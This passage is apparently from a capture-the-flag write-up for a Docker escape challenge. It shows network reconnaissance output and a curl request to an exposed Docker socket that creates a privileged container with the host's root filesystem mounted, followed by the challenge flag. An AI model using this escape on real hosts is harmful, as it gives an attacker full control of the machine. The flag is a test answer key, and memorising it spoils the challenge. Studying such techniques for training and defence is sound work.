`/v1.48/containers/json` and `/v1.48/images/list` IDs differ, inspecting `containers` API response returns details but not `images`.

Something about network is suspicious in this container.. We are inside `172.21.*` subnet and can't connect to any other; essentially isolated from other containers.
```bash
root@a56996d8d633:/tmp# cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.21.0.2       0x1         0x2         0e:f8:57:c6:a9:ef     *        eth0  
root@a56996d8d633:/tmp# arp -a
cybergame-fake-socket-vuln-master-1.calc_server_vuln_master_network (172.21.0.2) at 0e:f8:57:c6:a9:ef [ether] on eth0
root@a56996d8d633:/tmp# ifconfig | grep inet -B1
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.21.0.5  netmask 255.255.0.0  broadcast 172.21.255.255
--
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
```

Game was rigged from the start, the endpoint kept saying it was not required, yet it was the solution..
```bash
root@0751d0e17cd7:~# curl --unix-socket /run/docker/docker.sock -X POST \
>   -H "Content-Type: application/json" \
>   -d '{
>     "Image": "alpine",
>     "Cmd": ["chroot", "/mnt", "/bin/sh"],
>     "HostConfig": {
>       "Binds": ["/:/mnt"],
>       "Privileged": true
>     }
>   }' \
>   http://localhost/v1.48/containers/create?name=escape
{"message":"SK-CERT{4nd_7hat5_h0W_U_3scaP3_A_D0cK3r_c0nt41ne6}"}
```

> Credit: [lukaskuzmiak: cybergame.sk-2025-writeups, JAILE](https://github.com/lukaskuzmiak/cybergame.sk-2025-writeups/tree/main/JAILE)

::: tip Flag
`SK-CERT{4nd_7hat5_h0W_U_3scaP3_A_D0cK3r_c0nt41ne6}`
:::

